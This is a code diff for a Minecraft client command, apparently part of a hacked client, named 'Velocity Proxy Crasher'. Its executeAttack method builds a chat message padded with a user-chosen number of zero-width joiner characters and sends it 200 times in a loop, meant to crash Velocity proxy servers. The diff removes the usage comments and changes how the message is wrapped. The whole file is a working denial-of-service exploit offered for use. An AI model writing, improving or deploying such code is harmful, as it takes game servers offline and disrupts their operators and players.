@@ -9,19 +9,10 @@ import net.paradise_client.command.Command;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
 import net.minecraft.command.CommandSource;
+import net.minecraft.text.Text;
 
 /**
  * Command: Velocity Proxy Crasher
- * 
- * This command attempts to exploit velocity-based proxies by sending
- * spammed chat messages containing a zero-width joiner character.
- *
- * Usage:
- *   - /velocitycrasher <server> <power>
- * 
- * Arguments:
- *   - server: the target server name (String)
- *   - power:  the number of zero-width characters to repeat (min: 200)
  */
 public class VelocityCrasherCommand extends Command {
 
@@ -30,30 +21,25 @@ public class VelocityCrasherCommand extends Command {
     }
 
     /**
-     * Registers this command's structure with Brigadier.
+     * Register command arguments
      */
-    @Override
     public void register(LiteralArgumentBuilder<CommandSource> root) {
-        // Create the base literal command
         LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));
 
-        // "server" argument
         RequiredArgumentBuilder<CommandSource, String> serverArg =
                 RequiredArgumentBuilder.<CommandSource, String>argument("server", StringArgumentType.word())
                         .executes(ctx -> executeDefault(ctx));
 
-        // "power" argument
         RequiredArgumentBuilder<CommandSource, Integer> powerArg =
                 RequiredArgumentBuilder.<CommandSource, Integer>argument("power", IntegerArgumentType.integer(200))
                         .executes(ctx -> executeAttack(ctx));
 
-        // Chain arguments together
         serverArg.then(powerArg);
         literal.then(serverArg);
     }
 
     /**
-     * Executes the exploit logic when both arguments are provided.
+     * Executes the exploit logic
      */
     private int executeAttack(CommandContext<CommandSource> ctx) {
         Runnable task = () -> {
@@ -67,10 +53,10 @@ public class VelocityCrasherCommand extends Command {
             int power = ctx.getArgument("power", Integer.class);
 
             String filler = "\u200d"; // Zero-width joiner
-            String msg = "server " + server + " " + filler.repeat(power);
+            Text msgText = Text.literal("server " + server + " " + filler.repeat(power));
 
             for (int i = 0; i < 200; i++) {
-                net.sendPacket(new ChatMessageC2SPacket(msg));
+                net.sendPacket(new ChatMessageC2SPacket(msgText));
             }
 
             try {
@@ -84,9 +70,6 @@ public class VelocityCrasherCommand extends Command {
         return 1;
     }
 
-    /**
-     * Default executor when arguments are missing.
-     */
     private int executeDefault(CommandContext<CommandSource> ctx) {
         return 1;
     }
